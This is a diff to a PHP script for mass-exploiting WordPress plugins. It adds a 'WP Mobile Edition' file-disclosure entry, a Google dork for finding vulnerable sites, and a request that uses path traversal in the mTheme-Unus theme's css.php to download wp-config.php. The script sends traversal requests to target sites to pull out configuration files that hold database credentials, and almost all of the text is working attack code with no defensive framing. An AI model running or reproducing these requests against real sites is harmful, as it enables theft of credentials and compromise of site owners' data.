@@ -141,6 +141,11 @@
 # WordPress Aspose Cloud eBook Generator File Download Vulnerability
 # Vendor Homepage:: https://wordpress.org/plugins/aspose-cloud-ebook-generator/
 # ------------------------------------------------------------------------------
+#
+# Wordpress Plugin 'WP Mobile Edition' Remote File Disclosure Vulnerability
+# Vendor Homepage:: https://wordpress.org/plugins/wp-mobile-edition/
+# Google Dork: inurl:?fdx_switcher=mobile
+# ------------------------------------------------------------------------------
 # http://i.imgur.com/45BFlNe.png
 # ===============================================================================
 
@@ -239,6 +244,9 @@ __request($argv[1], '/wp-content/plugins/justified-image-grid/download.php?file=
 __request($argv[1], '/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php');
 
 __request($argv[1], '/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php');
+
+__request($argv[1], '/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php');
+
 
 function __request($url, $plugin) {
 
